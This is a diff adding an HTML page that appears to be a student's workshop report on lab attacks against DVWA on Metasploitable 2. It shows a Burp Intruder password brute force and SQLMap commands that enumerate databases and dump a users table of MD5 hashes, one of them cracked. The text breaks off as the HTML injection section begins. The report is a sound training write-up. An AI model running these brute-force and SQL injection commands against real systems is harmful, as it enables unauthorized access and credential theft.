@@ -1,0 +1,956 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta name="robots" content="index, follow">
+
+  <title>Day 5: Burp Suite Intruder Brute Force, SQLMap Database Dumping, HTML Injection & XSS Cookie Stealing | BugXploit Workshop | The WH2</title>
+  <meta name="description"
+    content="Day 5 deep-dive penetration testing report from BugXploit (Koteshwor): Burp Suite Intruder Sniper brute-force attack on DVWA, SQLMap automated database and table dumping, HTML Injection, Reflected and Stored XSS with client-side maxlength bypass, iFrame injection, and session cookie hijacking via Webhook.site.">
+  <meta name="keywords"
+    content="Ethical Hacking Day 5, BugXploit Workshop, Burp Suite Intruder, Sniper Attack, DVWA Brute Force, SQLMap tutorial, sqlmap dbs, sqlmap tables, sqlmap users dump, HTML Injection, Reflected XSS, Stored XSS, client-side limit bypass, Webhook.site cookie stealer, session hijacking, document.cookie, HttpOnly defense, Birendra Sah, Bishal Shrestha, Chandan Kumar Thakur, The WH2, Penetration Testing Nepal, Koteshwor Kathmandu">
+  <meta name="author" content="Chandan Kumar Thakur (The WH2)">
+
+  <link rel="canonical"
+    href="https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day5/">
+
+  <!-- Open Graph / Meta Consistency -->
+  <meta property="og:title"
+    content="Day 5: Burp Suite Brute Force, SQLMap Automated SQLi, HTML Injection & XSS Session Hijacking | BugXploit Workshop">
+  <meta property="og:description"
+    content="Exhaustive Day 5 penetration testing lab report: Burp Suite Intruder Sniper credential auditing, SQLMap database extraction, HTML injection, Reflected & Stored XSS, client-side maxlength bypass, and Webhook.site session exfiltration.">
+  <meta property="og:image" content="https://www.chandankumarthakur.com.np/assets/img/wh2.jpg">
+  <meta property="og:url"
+    content="https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day5/">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="The WH2 Knowledge Hub">
+
+  <!-- Twitter Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Day 5: Burp Intruder, SQLMap, HTML Injection & XSS Deep Dive | BugXploit">
+  <meta name="twitter:description"
+    content="Comprehensive Day 5 ethical hacking report: Burp Suite Intruder brute force, SQLMap database exploitation, XSS mechanics, and Webhook.site session stealing. Documented by The WH2.">
+  <meta name="twitter:image" content="https://www.chandankumarthakur.com.np/assets/img/wh2.jpg">
+
+  <!-- JSON-LD TechArticle Schema for Search Engines and AI Crawlers -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Day 5: Burp Suite Intruder Brute Force, SQLMap Database Dumping, HTML Injection & XSS Cookie Stealing - BugXploit Workshop",
+    "description": "Comprehensive technical penetration testing report covering Burp Suite Intruder Sniper brute-force attacks on DVWA, automated SQL injection using SQLMap in Kali Linux with session cookies, database enumeration (--dbs, -D dvwa --tables, -T users --dump), HTML injection, Reflected XSS (&lt;script&gt;alert(1)&lt;/script&gt;), Stored XSS with client-side maxlength bypass, iFrame injection, and session hijacking exfiltration via Webhook.site.",
+    "about": [
+      {
+        "@type": "SoftwareApplication",
+        "name": "Burp Suite Intruder"
+      },
+      {
+        "@type": "SoftwareApplication",
+        "name": "SQLMap"
+      },
+      {
+        "@type": "Thing",
+        "name": "SQL Injection (CWE-89)"
+      },
+      {
+        "@type": "Thing",
+        "name": "Cross-Site Scripting (XSS - CWE-79)"
+      },
+      {
+        "@type": "Thing",
+        "name": "HTML Injection (CWE-80)"
+      },
+      {
+        "@type": "Thing",
+        "name": "Session Hijacking"
+      }
+    ],
+    "author": {
+      "@type": "Person",
+      "name": "Chandan Kumar Thakur",
+      "alternateName": "The WH2",
+      "url": "https://www.chandankumarthakur.com.np/"
+    },
+    "contributor": [
+      {
+        "@type": "Person",
+        "name": "Birendra Sah",
+        "jobTitle": "Instructor",
+        "sameAs": "https://www.linkedin.com/in/birendrasah4u2/"
+      },
+      {
+        "@type": "Person",
+        "name": "Bishal Shrestha",
+        "jobTitle": "Instructor",
+        "sameAs": "https://www.linkedin.com/in/bishal0x01/"
+      }
+    ],
+    "publisher": {
+      "@type": "Organization",
+      "name": "The WH2 Knowledge Hub",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://www.chandankumarthakur.com.np/assets/img/wh2.jpg"
+      }
+    },
+    "datePublished": "2026-09-11",
+    "dateModified": "2026-09-11",
+    "inLanguage": "en",
+    "proficiencyLevel": "Intermediate",
+    "keywords": "Burp Suite Intruder, Sniper Attack, SQLMap, Automated SQL Injection, HTML Injection, Reflected XSS, Stored XSS, Webhook.site, Session Hijacking, Document Cookie, BugXploit, Kathmandu, Nepal, Chandan Kumar Thakur, The WH2",
+    "mainEntityOfPage": "https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day5/"
+  }
+  </script>
+
+  <!-- Favicons -->
+  <link href="../../../assets/img/wh2.jpg" rel="icon">
+  <link href="../../../assets/img/wh2.jpg" rel="wh2-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i|Fira+Code:400,500,600"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="../../../assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="../../../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../../../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="../../../assets/css/style.css" rel="stylesheet">
+
+  <style>
+    .lesson-meta-bar {
+      background: #f4f8fb;
+      border-left: 4px solid #149ddd;
+      padding: 15px 20px;
+      border-radius: 0 8px 8px 0;
+      margin-bottom: 30px;
+      font-size: 14px;
+    }
+
+    .lesson-article h2 {
+      color: #173b6c;
+      font-size: 24px;
+      font-weight: 700;
+      margin-top: 35px;
+      margin-bottom: 15px;
+      padding-bottom: 8px;
+      border-bottom: 2px solid #eef3f7;
+    }
+
+    .lesson-article h3 {
+      color: #2c4964;
+      font-size: 19px;
+      font-weight: 600;
+      margin-top: 25px;
+      margin-bottom: 12px;
+    }
+
+    .lesson-article h4 {
+      color: #3f6586;
+      font-size: 16px;
+      font-weight: 600;
+      margin-top: 18px;
+      margin-bottom: 8px;
+    }
+
+    .lesson-article p,
+    .lesson-article li {
+      font-size: 15.5px;
+      line-height: 1.75;
+      color: #333;
+    }
+
+    .lesson-article pre {
+      background: #1e1e1e;
+      color: #d4d4d4;
+      padding: 18px 20px;
+      border-radius: 8px;
+      font-family: 'Fira Code', Consolas, Monaco, monospace;
+      font-size: 13.5px;
+      overflow-x: auto;
+      margin: 18px 0;
+      border: 1px solid #333;
+      position: relative;
+    }
+
+    .lesson-article code {
+      font-family: 'Fira Code', Consolas, Monaco, monospace;
+      background: #eef2f7;
+      color: #b02a37;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 13.5px;
+    }
+
+    .lesson-article pre code {
+      background: transparent;
+      color: inherit;
+      padding: 0;
+    }
+
+    .callout-box {
+      background: #eef7fc;
+      border-left: 4px solid #149ddd;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-box.security-notice {
+      background: rgba(239, 68, 68, 0.08);
+      border-left-color: #ef4444;
+    }
+
+    .callout-box.security-notice h4 {
+      color: #b91c1c;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .callout-warning {
+      background: #fff8e6;
+      border-left: 4px solid #ffc107;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-danger {
+      background: #fdf2f2;
+      border-left: 4px solid #dc3545;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-success {
+      background: #f0fbf4;
+      border-left: 4px solid #198754;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .lesson-nav-buttons {
+      display: flex;
+      justify-content: space-between;
+      gap: 15px;
+      margin-top: 45px;
+      padding-top: 25px;
+      border-top: 1px solid #eef3f7;
+    }
+
+    .code-block-wrapper {
+      position: relative;
+    }
+
+    .code-copy-btn {
+      position: absolute;
+      top: 10px;
+      right: 12px;
+      background: rgba(255, 255, 255, 0.15);
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      color: #e0e0e0;
+      padding: 4px 10px;
+      font-size: 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      z-index: 5;
+    }
+
+    .code-copy-btn:hover {
+      background: #149ddd;
+      color: #fff;
+      border-color: #149ddd;
+    }
+
+    .code-copy-btn.copied {
+      background: #28a745;
+      color: #fff;
+      border-color: #28a745;
+    }
+
+    .terminal-window {
+      background: #0d1117;
+      border-radius: 8px;
+      border: 1px solid #30363d;
+      margin: 20px 0;
+      overflow: hidden;
+      font-family: 'Fira Code', monospace;
+    }
+
+    .terminal-header {
+      background: #161b22;
+      padding: 8px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid #30363d;
+    }
+
+    .terminal-circle {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+    }
+
+    .tc-red { background: #ff5f56; }
+    .tc-yellow { background: #ffbd2e; }
+    .tc-green { background: #27c93f; }
+
+    .terminal-title {
+      color: #8b949e;
+      font-size: 12px;
+      margin-left: 6px;
+    }
+
+    .terminal-body {
+      padding: 16px;
+      color: #c9d1d9;
+      font-size: 13.5px;
+      line-height: 1.6;
+    }
+
+    .prompt-symbol {
+      color: #58a6ff;
+      font-weight: bold;
+    }
+
+    .command-output {
+      color: #8b949e;
+    }
+  </style>
+</head>
+
+<body class="knowledge-page">
+
+  <main id="main">
+
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>Day 5: Burp Intruder, SQLMap & XSS Cookie Stealing</h2>
+          <ol>
+            <li><a href="../../../index.html">Home</a></li>
+            <li><a href="../../index.html">Knowledge</a></li>
+            <li><a href="../index.html">Ethical Hacking</a></li>
+            <li>Day 5 Report</li>
+          </ol>
+        </div>
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Lesson Detailed Content ======= -->
+    <section class="knowledge-section">
+      <div class="container" data-aos="fade-up">
+
+        <div class="row">
+          <div class="col-lg-9 mx-auto">
+
+            <article class="lesson-article">
+
+              <!-- Article Header / Meta -->
+              <div class="border-bottom pb-3 mb-4">
+                <div class="d-flex flex-wrap gap-2 mb-2">
+                  <span class="badge bg-primary">Session 05 / 14</span>
+                  <span class="badge bg-dark">BugXploit Workshop</span>
+                </div>
+                <h1 class="fw-bold" style="color: #173b6c; font-size: 28px; line-height: 1.3;">
+                  Day 5: Burp Suite Intruder Brute Force, SQLMap Database Dumping, HTML Injection &amp; XSS Cookie Stealing
+                </h1>
+                <div class="text-muted d-flex flex-wrap gap-3 mt-2 small align-items-center">
+                  <span><i class="bi bi-person-circle text-primary"></i> <strong>Report By:</strong> TheWH2</span>
+                  <span>
+                    <i class="bi bi-person-video3 text-primary"></i> <strong>Instructors:</strong>
+                    <a href="https://www.linkedin.com/in/birendrasah4u2/" target="_blank" rel="noopener noreferrer"
+                      class="text-primary fw-semibold">
+                      Birendra Sah <i class="bi bi-linkedin" style="font-size: 12px;"></i>
+                    </a>
+                    &bull;
+                    <a href="https://www.linkedin.com/in/bishal0x01/" target="_blank" rel="noopener noreferrer"
+                      class="text-primary fw-semibold">
+                      Bishal Shrestha <i class="bi bi-linkedin" style="font-size: 12px;"></i>
+                    </a>
+                  </span>
+                  <span><i class="bi bi-building text-primary"></i> <strong>Institute:</strong> BugXploit (Koteshwor)</span>
+                  <span><i class="bi bi-clock text-primary"></i> <strong>Read Time:</strong> ~16 mins</span>
+                </div>
+              </div>
+
+              <!-- Content Body -->
+              <div class="article-content">
+
+                <!-- Alert/Notice Box -->
+                <div class="callout-box security-notice">
+                  <h4><i class="bi bi-shield-exclamation"></i> Security Notice &amp; Lab Scope</h4>
+                  <p class="mb-0 small">
+                    This documentation captures authentic penetration testing exercises conducted in an isolated local virtual environment during Day 5 of the Ethical Hacking and Penetration Testing Workshop at <strong>BugXploit</strong> (Koteshwor, Kathmandu). All attacks, automated SQL injection audits, and XSS payload demonstrations were performed against local Damn Vulnerable Web Application (DVWA) instances on Metasploitable 2 for educational, authorized testing, and defensive engineering research.
+                  </p>
+                </div>
+
+                <!-- Table of Contents -->
+                <div class="card mb-4 border-light shadow-sm" style="background: #fafcfe;">
+                  <div class="card-body">
+                    <h5 class="fw-bold mb-3" style="color: #173b6c;"><i class="bi bi-list-nested"></i> Table of Contents
+                    </h5>
+                    <div class="row">
+                      <div class="col-md-6">
+                        <ul class="mb-0" style="font-size: 14.5px; line-height: 1.9;">
+                          <li><a href="#lab-overview" class="text-decoration-none">1. Lab Environment Architecture &amp; Target Setup</a></li>
+                          <li><a href="#dvwa-bruteforce" class="text-decoration-none">2. Web Authentication &amp; DVWA Brute Force Endpoint</a></li>
+                          <li><a href="#burp-intruder-sniper" class="text-decoration-none">3. Burp Suite Intruder: Sniper Attack &amp; Recovery</a></li>
+                          <li><a href="#sqlmap-introduction" class="text-decoration-none">4. Automated SQL Injection with SQLMap</a></li>
+                          <li><a href="#sqlmap-session-cookie" class="text-decoration-none">5. Authenticated Probing via Session Cookies</a></li>
+                          <li><a href="#sqlmap-db-enumeration" class="text-decoration-none">6. Database &amp; Table Schema Enumeration</a></li>
+                          <li><a href="#sqlmap-dump-hashes" class="text-decoration-none">7. Dumping Credentials &amp; Cracking Hashes</a></li>
+                        </ul>
+                      </div>
+                      <div class="col-md-6">
+                        <ul class="mb-0" style="font-size: 14.5px; line-height: 1.9;">
+                          <li><a href="#html-injection" class="text-decoration-none">8. HTML Injection Mechanics: &lt;b&gt;TheWH2&lt;/b&gt;</a></li>
+                          <li><a href="#xss-reflected" class="text-decoration-none">9. Reflected XSS: &lt;script&gt;alert(1)&lt;/script&gt;</a></li>
+                          <li><a href="#xss-stored-bypass" class="text-decoration-none">10. Stored XSS &amp; Client-Side Limit Bypass</a></li>
+                          <li><a href="#iframe-session-hijacking" class="text-decoration-none">11. iFrame Injection &amp; Webhook.site Session Stealing</a></li>
+                          <li><a href="#defense-remediation" class="text-decoration-none">12. Defensive Hardening: PDO, Encoding &amp; HttpOnly</a></li>
+                          <li><a href="#day5-takeaways" class="text-decoration-none">13. Day 5 Summary &amp; Key Takeaways</a></li>
+                        </ul>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- 1. Lab Environment Architecture -->
+                <h2 id="lab-overview">1. Lab Environment Architecture &amp; Target Setup</h2>
+                <p>
+                  Building upon the command injection and CSRF attack vectors explored in <a href="../day4/index.html">Day 4</a>, Day 5 transitioned into advanced automated exploitation and client-side web application vulnerabilities. Instructors <strong>Birendra Sah</strong> and <strong>Bishal Shrestha</strong> configured our isolated lab subnet inside Oracle VirtualBox:
+                </p>
+                <ul>
+                  <li><strong>Attacker Workstation:</strong> Kali Linux 2026.2 (IP: <code>192.168.1.x</code>) running Burp Suite Community Proxy, SQLMap, Netcat, and Firefox with FoxyProxy integration.</li>
+                  <li><strong>Vulnerable Target Server:</strong> Metasploitable 2 Linux Server hosting the Apache/PHP web stack at <code>http://192.168.1.146/</code> (and mirrored at <code>http://192.168.1.141/</code>).</li>
+                  <li><strong>Core Application:</strong> Damn Vulnerable Web Application (DVWA) accessible at:
+                    <pre><code>http://192.168.1.146/dvwa/</code></pre>
+                  </li>
+                  <li><strong>Default Initial Credentials:</strong> Username: <code>admin</code> | Password: <code>password</code></li>
+                  <li><strong>External Listener Endpoint:</strong> <a href="https://webhook.site/" target="_blank" rel="noopener noreferrer">Webhook.site</a> used as an attacker-controlled external HTTP capture listener for live out-of-band XSS exfiltration demonstrations.</li>
+                </ul>
+
+                <!-- 2. Web Authentication & DVWA Brute Force Endpoint -->
+                <h2 id="dvwa-bruteforce">2. Web Authentication &amp; DVWA Brute Force Endpoint</h2>
+                <p>
+                  The first practical module focused on authentication weaknesses. In many web applications, login interfaces lack rate-limiting, CAPTCHA validation, or account lockouts, leaving them exposed to high-speed credential stuffing or dictionary attacks.
+                </p>
+                <p>
+                  We navigated to the DVWA brute force testing endpoint:
+                </p>
+                <pre><code>http://192.168.1.146/dvwa/vulnerabilities/brute/</code></pre>
+                <p>
+                  The interface presents a simple HTTP authentication form with two input parameters: <code>username</code> and <code>password</code>. When an invalid credential pair is submitted, the application returns:
+                </p>
+                <pre><code>&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;</code></pre>
+                <p>
+                  Because this feedback is transmitted over cleartext HTTP and lacks anti-automation controls, it provides a prime candidate for automated password dictionary attacks using <strong>Burp Suite Intruder</strong>.
+                </p>
+
+                <!-- 3. Burp Suite Intruder: Sniper Attack -->
+                <h2 id="burp-intruder-sniper">3. Burp Suite Intruder: Sniper Attack &amp; Recovery</h2>
+                <p>
+                  To crack the password for the <code>admin</code> user systematically, we launched Burp Suite and captured the authentication request inside <strong>Burp Proxy</strong>:
+                </p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Burp Suite Proxy - Intercepted HTTP Request</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div class="command-output">GET /dvwa/vulnerabilities/brute/?username=admin&amp;password=test&amp;Login=Login HTTP/1.1</div>
+                    <div class="command-output">Host: 192.168.1.146</div>
+                    <div class="command-output">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</div>
+                    <div class="command-output">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div>
+                    <div class="command-output">Referer: http://192.168.1.146/dvwa/vulnerabilities/brute/</div>
+                    <div class="command-output">Cookie: security=low; PHPSESSID=ff1bb41c0a0d051dd7bdc0d5c082deb5</div>
+                    <div class="command-output">Connection: keep-alive</div>
+                  </div>
+                </div>
+
+                <h3>Step A: Sending Request to Intruder</h3>
+                <p>
+                  Right-clicked inside the request window and selected <strong>Send to Intruder</strong> (shortcut: <code>Ctrl + I</code>).
+                </p>
+
+                <h3>Step B: Configuring Positions &amp; Attack Type</h3>
+                <p>
+                  Under the <strong>Positions</strong> tab, Burp Suite automatically wraps multiple parameters with payload markers (<code>§</code>). We clicked <strong>Clear §</strong>, selected the <strong>Sniper</strong> attack type, and positioned payload markers exclusively around the <code>password</code> value:
+                </p>
+                <pre><code>GET /dvwa/vulnerabilities/brute/?username=admin&amp;password=§test§&amp;Login=Login HTTP/1.1</code></pre>
+
+                <div class="p-3 border rounded bg-light my-3">
+                  <h5 class="fw-bold mb-2 text-primary"><i class="bi bi-info-circle"></i> Why the Sniper Attack?</h5>
+                  <p class="small text-muted mb-0">
+                    The <strong>Sniper</strong> attack type uses a single set of payloads. It targets each position in turn and replaces it with each candidate string from our wordlist while keeping all other parameters constant. Because the username <code>admin</code> was known, Sniper was the fastest and most efficient attack mode.
+                  </p>
+                </div>
+
+                <h3>Step C: Loading Payloads &amp; Launching Attack</h3>
+                <p>
+                  Under the <strong>Payloads</strong> tab, we set <strong>Payload type</strong> to <em>Simple list</em> and pasted common passwords (e.g., <code>123456</code>, <code>admin</code>, <code>root</code>, <code>toor</code>, <code>welcome</code>, <code>password</code>, <code>letmein</code>). We then clicked <strong>Start Attack</strong>.
+                </p>
+
+                <h3>Step D: Analyzing Response Length &amp; Status Code</h3>
+                <p>
+                  While observing the Intruder attack results table, every incorrect password attempt yielded an HTTP 200 response with a consistent body length (around <code>4532 bytes</code>) containing the string <em>"Username and/or password incorrect"</em>.
+                </p>
+                <p>
+                  However, for the candidate payload <strong><code>password</code></strong>, the response length deviated significantly (e.g. <code>4580 bytes</code>). Inspecting the response body confirmed the successful authentication indicator:
+                </p>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Burp Intruder - Successful Match Response Body</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div class="text-success fw-bold">&lt;pre&gt;&lt;br /&gt;Welcome to the password protected area admin&lt;/pre&gt;</div>
+                  </div>
+                </div>
+                <p>
+                  We verified the recovered credentials by logging into DVWA with <code>admin</code> / <code>password</code>.
+                </p>
+
+                <!-- 4. Automated SQL Injection with SQLMap -->
+                <h2 id="sqlmap-introduction">4. Automated SQL Injection with SQLMap</h2>
+                <p>
+                  Manual SQL injection testing (such as injecting <code>' OR '1'='1</code> or <code>UNION SELECT</code>) reveals injection points, but in enterprise penetration testing assessments, automated tools accelerate vulnerability verification and data mapping.
+                </p>
+                <p>
+                  Instructor <strong>Birendra Sah</strong> introduced us to <strong>SQLMap</strong>—the world's foremost open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.
+                </p>
+                <p>We verified the installation and explored the command structure in Kali Linux:</p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Terminal - Kali Linux</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div><span class="prompt-symbol">┌──(kali㉿kali)-[~]</span></div>
+                    <div><span class="prompt-symbol">└─$</span> sqlmap -h</div>
+                    <div class="command-output">        ___</div>
+                    <div class="command-output">       __H__</div>
+                    <div class="command-output"> ___ ___[,]_____ ___ ___  {1.8.3#stable}</div>
+                    <div class="command-output">|_ -| . [']     | .'| . |</div>
+                    <div class="command-output">|___|_  ["]_|_|_|__,|  _|   https://sqlmap.org</div>
+                    <div class="command-output">      |_|V...       |_|</div>
+                    <br>
+                    <div class="command-output">Usage: python3 sqlmap [options]</div>
+                    <div class="command-output">Target:</div>
+                    <div class="command-output">  -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")</div>
+                    <div class="command-output">Request:</div>
+                    <div class="command-output">  --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")</div>
+                    <div class="command-output">Enumeration:</div>
+                    <div class="command-output">  --dbs               Enumerate DBMS databases</div>
+                    <div class="command-output">  -D DB               DBMS database to enumerate</div>
+                    <div class="command-output">  --tables            Enumerate DBMS database tables</div>
+                    <div class="command-output">  -T TBL              DBMS database table(s) to enumerate</div>
+                    <div class="command-output">  --dump              Dump DBMS database table entries</div>
+                  </div>
+                </div>
+
+                <!-- 5. Authenticated Probing via Session Cookies -->
+                <h2 id="sqlmap-session-cookie">5. Authenticated Probing via Session Cookies</h2>
+                <p>
+                  The SQL Injection endpoint on DVWA is located behind authentication:
+                </p>
+                <pre><code>http://192.168.1.141/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#</code></pre>
+                <p>
+                  If an ethical hacker runs <code>sqlmap -u "http://192.168.1.141/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#"</code> directly without credentials, DVWA redirects the request to <code>login.php</code>, causing the scan to fail completely.
+                </p>
+                <p>
+                  To allow SQLMap to authenticate as our logged-in session, we extracted our active session cookie from the browser (or Burp Suite) and supplied it via the <code>--cookie</code> flag:
+                </p>
+                <pre><code>--cookie="PHPSESSID=ff1bb41c0a0d051dd7bdc0d5c082deb5;security=low"</code></pre>
+
+                <!-- 6. Database & Table Schema Enumeration -->
+                <h2 id="sqlmap-db-enumeration">6. Database &amp; Table Schema Enumeration</h2>
+                <p>
+                  With the authentication parameters in place, we executed our first discovery command to extract all accessible database names from the back-end MySQL instance:
+                </p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Terminal - Enumerate DBMS Databases (--dbs)</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div><span class="prompt-symbol">┌──(kali㉿kali)-[~]</span></div>
+                    <div><span class="prompt-symbol">└─$</span> sqlmap -u 'http://192.168.1.141/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#' --cookie="PHPSESSID=ff1bb41c0a0d051dd7bdc0d5c082deb5;security=low" --dbs</div>
+                    <div class="command-output">[INFO] testing connection to the target URL</div>
+                    <div class="command-output">[INFO] checking if the target is protected by some kind of WAF/IPS</div>
+                    <div class="command-output">[INFO] target URL appears to be UNION injectable with 2 columns</div>
+                    <div class="command-output">[INFO] the back-end DBMS is MySQL</div>
+                    <div class="command-output">web server operating system: Linux Ubuntu</div>
+                    <div class="command-output">web application technology: Apache 2.2.8, PHP 5.2.4</div>
+                    <div class="command-output">back-end DBMS: MySQL &gt;= 5.0.0</div>
+                    <div class="command-output">available databases [6]:</div>
+                    <div class="command-output">[*] dvwa</div>
+                    <div class="command-output">[*] information_schema</div>
+                    <div class="command-output">[*] mysql</div>
+                    <div class="command-output">[*] owasp10</div>
+                    <div class="command-output">[*] tikiwiki</div>
+                    <div class="command-output">[*] twiki</div>
+                  </div>
+                </div>
+
+                <p>
+                  SQLMap confirmed that the <code>id</code> parameter was vulnerable to boolean-based blind, error-based, and UNION query SQL injection. We immediately targeted the application database <code>dvwa</code> to extract its table list:
+                </p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Terminal - Enumerate Tables (-D dvwa --tables)</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div><span class="prompt-symbol">┌──(kali㉿kali)-[~]</span></div>
+                    <div><span class="prompt-symbol">└─$</span> sqlmap -u 'http://192.168.1.141/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#' --cookie="PHPSESSID=ff1bb41c0a0d051dd7bdc0d5c082deb5;security=low" -D dvwa --tables</div>
+                    <div class="command-output">Database: dvwa</div>
+                    <div class="command-output">[2 tables]</div>
+                    <div class="command-output">+-----------+</div>
+                    <div class="command-output">| guestbook |</div>
+                    <div class="command-output">| users     |</div>
+                    <div class="command-output">+-----------+</div>
+                  </div>
+                </div>
+
+                <!-- 7. Dumping Credentials & Cracking Hashes -->
+                <h2 id="sqlmap-dump-hashes">7. Dumping Credentials &amp; Cracking Hashes</h2>
+                <p>
+                  The table <code>users</code> was the highest-value target. We instructed SQLMap to dump all records from the <code>users</code> table inside the <code>dvwa</code> database:
+                </p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Terminal - Credential Dump (-D dvwa -T users --dump)</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div><span class="prompt-symbol">┌──(kali㉿kali)-[~]</span></div>
+                    <div><span class="prompt-symbol">└─$</span> sqlmap -u 'http://192.168.1.141/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#' --cookie="PHPSESSID=ff1bb41c0a0d051dd7bdc0d5c082deb5;security=low" -D dvwa -T users --dump</div>
+                    <div class="command-output">Database: dvwa</div>
+                    <div class="command-output">Table: users</div>
+                    <div class="command-output">[5 entries]</div>
+                    <div class="command-output">+---------+------------+------------+----------------------------------+</div>
+                    <div class="command-output">| user_id | first_name | last_name  | password                         |</div>
+                    <div class="command-output">+---------+------------+------------+----------------------------------+</div>
+                    <div class="command-output">| 1       | admin      | admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |</div>
+                    <div class="command-output">| 2       | Gordon     | Brown      | e99a18c428cb38d5f260853678922e03 |</div>
+                    <div class="command-output">| 3       | Hack       | Me         | 8d3533d75ae2c3966d7e0d4f8146e266 |</div>
+                    <div class="command-output">| 4       | Pablo      | Picasso    | 0d107d09f5bbe40ade3de5ec94a6b027 |</div>
+                    <div class="command-output">| 5       | Bob        | Smith      | 5f4dcc3b5aa765d61d8327deb882cf99 |</div>
+                    <div class="command-output">+---------+------------+------------+----------------------------------+</div>
+                    <div class="command-output">[INFO] recognized MD5 password hashes</div>
+                    <div class="command-output">[INFO] cracking hash '5f4dcc3b5aa765d61d8327deb882cf99' -&gt; 'password'</div>
+                  </div>
+                </div>
+
+                <p>
+                  SQLMap automatically identified that the passwords were encrypted with unsalted MD5 hashes and cracked <code>5f4dcc3b5aa765d61d8327deb882cf99</code> to <code>password</code> instantly using its built-in dictionary lookup. This concluded the database takeover assessment.
+                </p>
+
+                <!-- 8. HTML Injection Mechanics -->
+                <h2 id="html-injection">8. HTML Injection Mechanics: &lt;b&gt;TheWH2&lt;/b&gt;</h2>
+                <p>
+                  Next, the workshop transitioned into client-side vulnerabilities, starting with <strong>HTML Injection (Hypertext Markup Language Injection)</strong>.
+                </p>
+                <p>
